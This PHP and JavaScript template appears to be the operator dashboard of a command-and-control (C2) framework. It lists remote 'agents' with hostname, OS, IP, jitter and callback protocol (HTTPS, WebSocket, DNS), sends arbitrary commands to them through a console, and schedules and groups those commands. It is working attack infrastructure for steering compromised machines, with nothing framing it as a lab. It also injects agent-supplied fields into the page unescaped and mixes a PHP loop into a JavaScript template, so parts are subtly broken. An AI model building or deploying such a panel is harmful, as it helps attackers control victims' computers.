<?php ob_start(); ?>
<div>
    <div class="flex justify-between items-center mb-6 flex-wrap gap-2">
        <h1 class="text-3xl font-bold cosmic-glow-text">🌍 Global Cosmic C2</h1>
        <div class="flex gap-2">
            <button onclick="fetchData()" class="cosmic-btn"><i class="fas fa-sync"></i> Refresh</button>
            <button onclick="showCreateGroup()" class="cosmic-btn"><i class="fas fa-plus"></i> New Group</button>
        </div>
    </div>

    <!-- Tabs -->
    <div class="flex gap-2 mb-4">
        <button class="cosmic-btn active-tab" data-tab="agents">Agents</button>
        <button class="cosmic-btn" data-tab="groups">Groups</button>
        <button class="cosmic-btn" data-tab="scheduled">Scheduled</button>
        <button class="cosmic-btn" data-tab="console">Console</button>
        <button class="cosmic-btn" data-tab="analytics">Analytics</button>
    </div>

    <!-- Tab: Agents -->
    <div id="tab-agents" class="tab-content cosmic-glass p-4 rounded-2xl overflow-auto">
        <div class="table-wrapper">
            <table class="w-full text-sm cosmic-table">
                <thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th>Group</th><th>Protocol</th><th class="text-right">Actions</th></tr></thead>
                <tbody id="agentsList"><tr><td colspan="9" class="text-center text-gray-400">Loading...</td></tr></tbody>
            </table>
        </div>
    </div>

    <!-- Tab: Groups -->
    <div id="tab-groups" class="tab-content hidden cosmic-glass p-4 rounded-2xl overflow-auto">
        <div id="groupsList"><p class="text-gray-400">Loading groups...</p></div>
    </div>

    <!-- Tab: Scheduled -->
    <div id="tab-scheduled" class="tab-content hidden cosmic-glass p-4 rounded-2xl overflow-auto">
        <div id="scheduledList"><p class="text-gray-400">Loading scheduled tasks...</p></div>
    </div>

    <!-- Tab: Console -->
    <div id="tab-console" class="tab-content hidden cosmic-glass p-4 rounded-2xl">
        <div class="mb-2">
            <label>Agent ID:</label>
            <input type="text" id="consoleAgentId" placeholder="Enter agent ID" class="mb-2">
            <label>Command:</label>
            <input type="text" id="consoleCommand" placeholder="e.g., whoami" class="mb-2">
            <button onclick="sendConsoleCommand()" class="cosmic-btn"><i class="fas fa-paper-plane"></i> Send</button>
        </div>
        <div id="consoleOutput" class="bg-black/50 p-4 rounded-xl h-64 overflow-y-auto font-mono text-sm">
            <div class="text-gray-400">Awaiting commands...</div>
        </div>
    </div>

    <!-- Tab: Analytics -->
    <div id="tab-analytics" class="tab-content hidden cosmic-glass p-4 rounded-2xl">
        <div id="analyticsData"><p class="text-gray-400">Loading analytics...</p></div>
    </div>
</div>

<!-- View/Edit Modal (reused) -->
<div id="viewEditModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm hidden items-center justify-center z-50">
    <div class="cosmic-glass p-6 rounded-2xl w-96 max-w-full">
        <h2 id="veTitle" class="text-xl mb-4 cosmic-glow-text">Details</h2>
        <div id="veContent"></div>
        <div class="flex gap-2 mt-4">
            <button onclick="saveEditAgent()" class="cosmic-btn flex-1">Save</button>
            <button type="button" onclick="document.getElementById('viewEditModal').classList.add('hidden')" class="cosmic-btn">Close</button>
        </div>
    </div>
</div>

<script>
let currentEditId = null;

// Tab switching
document.querySelectorAll('[data-tab]').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('[data-tab]').forEach(b => b.classList.remove('active-tab'));
        this.classList.add('active-tab');
        const tab = this.dataset.tab;
        document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
        document.getElementById('tab-' + tab).classList.remove('hidden');
        if (tab === 'groups') fetchGroups();
        if (tab === 'scheduled') fetchScheduled();
        if (tab === 'analytics') fetchAnalytics();
    });
});

// ---- Agents ----
async function fetchAgents() {
    const res = await fetch('/c2/agents');
    const data = await res.json();
    let html = '';
    if (!data.agents || data.agents.length === 0) {
        html = '<tr><td colspan="9" class="text-center text-gray-400">No agents registered.</td></tr>';
    } else {
        data.agents.forEach(a => {
            html += `<tr>
                <td class="p-2">${a.id}</td>
                <td class="p-2">${a.hostname}</td>
                <td class="p-2">${a.os}</td>
                <td class="p-2">${a.ip_address}</td>
                <td class="p-2">${new Date(a.last_seen).toLocaleString()}</td>
                <td class="p-2"><span class="cosmic-badge ${a.status==='active'?'border-green-400 text-green-400':'border-gray-400 text-gray-400'}">${a.status}</span></td>
                <td class="p-2">${a.group_id || 'N/A'}</td>
                <td class="p-2">${a.protocol || 'https'}</td>
                <td class="p-2 text-right">
                    <button onclick="viewAgent(${a.id})" class="text-blue-400 hover:text-blue-300"><i class="fas fa-eye"></i></button>
                    <button onclick="editAgent(${a.id})" class="text-yellow-400 hover:text-yellow-300"><i class="fas fa-edit"></i></button>
                    <button onclick="scheduleCommand(${a.id})" class="text-purple-400 hover:text-purple-300"><i class="fas fa-clock"></i></button>
                    <button onclick="sendCommand('${a.agent_id}')" class="text-green-400 hover:text-green-300"><i class="fas fa-terminal"></i></button>
                    <button onclick="deleteAgent(${a.id})" class="text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button>
                </td>
            </tr>`;
        });
    }
    document.getElementById('agentsList').innerHTML = html;
}

// ---- Groups ----
async function fetchGroups() {
    const res = await fetch('/c2/groups');
    const data = await res.json();
    let html = '<div class="space-y-2">';
    if (!data.groups || data.groups.length === 0) {
        html += '<p class="text-gray-400">No groups.</p>';
    } else {
        data.groups.forEach(g => {
            html += `<div class="cosmic-glass p-3 rounded flex justify-between items-center">
                <span><strong>${g.name}</strong> - ${g.description || ''}</span>
                <span>
                    <button onclick="deleteGroup(${g.id})" class="text-red-400"><i class="fas fa-trash"></i></button>
                </span>
            </div>`;
        });
    }
    html += '</div>';
    document.getElementById('groupsList').innerHTML = html;
}

// ---- Scheduled ----
async function fetchScheduled() {
    const res = await fetch('/c2/scheduled');
    const data = await res.json();
    let html = '<div class="space-y-2">';
    if (!data.scheduled_tasks || data.scheduled_tasks.length === 0) {
        html += '<p class="text-gray-400">No scheduled tasks.</p>';
    } else {
        data.scheduled_tasks.forEach(t => {
            html += `<div class="cosmic-glass p-3 rounded flex justify-between items-center">
                <span>Agent ${t.agent_id}: ${t.command} (${t.scheduled_at})</span>
                <button onclick="cancelScheduled(${t.id})" class="text-red-400"><i class="fas fa-times"></i></button>
            </div>`;
        });
    }
    html += '</div>';
    document.getElementById('scheduledList').innerHTML = html;
}

// ---- Console ----
async function sendConsoleCommand() {
    const agentId = document.getElementById('consoleAgentId').value;
    const command = document.getElementById('consoleCommand').value;
    if (!agentId || !command) { alert('Agent ID and command required'); return; }
    const output = document.getElementById('consoleOutput');
    output.innerHTML += `<div class="text-green-400">> ${command}</div>`;
    const fd = new FormData();
    fd.append('agent_id', agentId);
    fd.append('command', command);
    const res = await fetch('/c2/command', { method: 'POST', body: fd });
    const data = await res.json();
    output.innerHTML += `<div class="text-blue-400">[${data.status}]</div>`;
    output.scrollTop = output.scrollHeight;
    document.getElementById('consoleCommand').value = '';
}

// ---- Analytics ----
async function fetchAnalytics() {
    const res = await fetch('/c2/analytics');
    const data = await res.json();
    let html = `<div class="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div><strong>Total Agents:</strong> ${data.total_agents}</div>
        <div><strong>Active:</strong> ${data.active_agents}</div>
        <div><strong>Pending Tasks:</strong> ${data.pending_tasks}</div>
        <div><strong>Scheduled:</strong> ${data.scheduled_tasks}</div>
    </div>`;
    if (data.groups && data.groups.length) {
        html += '<h4 class="mt-4">Groups</h4><ul>';
        data.groups.forEach(g => { html += `<li>${g.name}</li>`; });
        html += '</ul>';
    }
    document.getElementById('analyticsData').innerHTML = html;
}

// ---- Actions ----
async function viewAgent(id) {
    const res = await fetch(`/c2/view?id=${id}`);
    const data = await res.json();
    const a = data.agent;
    let html = `<div class="space-y-2 text-sm">
        <p><strong>ID:</strong> ${a.id}</p>
        <p><strong>Agent ID:</strong> ${a.agent_id}</p>
        <p><strong>Hostname:</strong> ${a.hostname}</p>
        <p><strong>OS:</strong> ${a.os}</p>
        <p><strong>IP:</strong> ${a.ip_address}</p>
        <p><strong>Status:</strong> ${a.status}</p>
        <p><strong>Group:</strong> ${a.group_id}</p>
        <p><strong>Protocol:</strong> ${a.protocol}</p>
        <p><strong>Jitter:</strong> ${a.jitter}</p>
        <p><strong>Uptime:</strong> ${a.uptime}</p>
        <hr><h4>Tasks:</h4>`;
    if (data.tasks && data.tasks.length) {
        data.tasks.forEach(t => { html += `<div>${t.command} - ${t.status}</div>`; });
    } else {
        html += '<p>No tasks.</p>';
    }
    html += '</div>';
    document.getElementById('veContent').innerHTML = html;
    document.getElementById('veTitle').innerText = 'View Agent';
    document.getElementById('viewEditModal').classList.remove('hidden');
}

async function editAgent(id) {
    const res = await fetch(`/c2/view?id=${id}`);
    const data = await res.json();
    const a = data.agent;
    let html = `
        <input type="hidden" id="editId" value="${a.id}">
        <div><label>Hostname</label><input type="text" id="editHostname" value="${a.hostname}" class="mb-2"></div>
        <div><label>OS</label><input type="text" id="editOs" value="${a.os}" class="mb-2"></div>
        <div><label>IP</label><input type="text" id="editIp" value="${a.ip_address}" class="mb-2"></div>
        <div><label>Description</label><textarea id="editDesc" class="mb-2">${a.description || ''}</textarea></div>
        <div><label>Tags</label><input type="text" id="editTags" value="${a.tags || ''}" class="mb-2"></div>
        <div><label>Protocol</label><select id="editProtocol" class="mb-2">
            <option value="https" ${a.protocol=='https'?'selected':''}>HTTPS</option>
            <option value="websocket" ${a.protocol=='websocket'?'selected':''}>WebSocket</option>
            <option value="dns" ${a.protocol=='dns'?'selected':''}>DNS</option>
        </select></div>
        <div><label>Jitter (seconds)</label><input type="number" id="editJitter" value="${a.jitter || 0}" class="mb-2"></div>
        <div><label>Group</label><select id="editGroup" class="mb-2">
            <option value="">None</option>
            <?php foreach ($groups as $g): ?>
            <option value="<?= $g['id'] ?>" <?= ($a['group_id']==$g['id'])?'selected':'' ?>><?= $g['name'] ?></option>
            <?php endforeach; ?>
        </select></div>
        <div><label>Status</label><select id="editStatus" class="mb-2">
            <option value="active" ${a.status=='active'?'selected':''}>Active</option>
            <option value="inactive" ${a.status=='inactive'?'selected':''}>Inactive</option>
        </select></div>
    `;
    document.getElementById('veContent').innerHTML = html;
    document.getElementById('veTitle').innerText = 'Edit Agent';
    document.getElementById('viewEditModal').classList.remove('hidden');
    currentEditId = id;
}

async function saveEditAgent() {
    const id = currentEditId || document.getElementById('editId').value;
    if (!id) return;
    const data = {
        id: id,
        hostname: document.getElementById('editHostname').value,
        os: document.getElementById('editOs').value,
        ip_address: document.getElementById('editIp').value,
        description: document.getElementById('editDesc').value,
        tags: document.getElementById('editTags').value,
        protocol: document.getElementById('editProtocol').value,
        jitter: document.getElementById('editJitter').value,
        group_id: document.getElementById('editGroup').value,
        status: document.getElementById('editStatus').value
    };
    const res = await fetch('/c2/edit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    if (res.ok) { location.reload(); } else { alert('Error updating agent'); }
}

async function sendCommand(agentId) {
    const cmd = prompt('Enter command:');
    if (!cmd) return;
    const fd = new FormData(); fd.append('agent_id', agentId); fd.append('command', cmd);
    const res = await fetch('/c2/command', { method: 'POST', body: fd });
    const data = await res.json();
    alert(data.status || data.error);
}

async function scheduleCommand(agentId) {
    const cmd = prompt('Enter command:');
    if (!cmd) return;
    const when = prompt('Schedule time (YYYY-MM-DD HH:MM:SS):');
    if (!when) return;
    const fd = new FormData(); fd.append('agent_id', agentId); fd.append('command', cmd); fd.append('scheduled_at', when);
    const res = await fetch('/c2/schedule', { method: 'POST', body: fd });
    const data = await res.json();
    alert(data.status || data.error);
    fetchScheduled();
}

async function deleteAgent(id) {
    if (!confirm('Delete agent?')) return;
    const fd = new FormData(); fd.append('id', id);
    await fetch('/c2/delete', { method: 'POST', body: fd });
    fetchAgents();
}

// ---- Groups ----
async function showCreateGroup() {
    const name = prompt('Group name:');
    if (!name) return;
    const desc = prompt('Description (optional):') || '';
    const fd = new FormData(); fd.append('name', name); fd.append('description', desc);
    await fetch('/c2/group/create', { method: 'POST', body: fd });
    fetchGroups();
}

async function deleteGroup(id) {
    if (!confirm('Delete group?')) return;
    const fd = new FormData(); fd.append('id', id);
    await fetch('/c2/group/delete', { method: 'POST', body: fd });
    fetchGroups();
}

// ---- Scheduled ----
async function cancelScheduled(id) {
    if (!confirm('Cancel scheduled task?')) return;
    const fd = new FormData(); fd.append('id', id);
    await fetch('/c2/schedule/cancel', { method: 'POST', body: fd });
    fetchScheduled();
}

// ---- Initial load ----
function fetchData() {
    fetchAgents();
    fetchGroups();
    fetchScheduled();
    fetchAnalytics();
}
fetchData();
setInterval(fetchData, 30000);
</script>

<style>
.active-tab {
    background: linear-gradient(135deg, rgba(0,255,136,0.2), rgba(251,191,36,0.2));
    border-color: #00ff88 !important;
}
.tab-content {
    min-height: 300px;
}
</style>
<?php $content = ob_get_clean(); require_once __DIR__ . '/../layout.php'; ?>
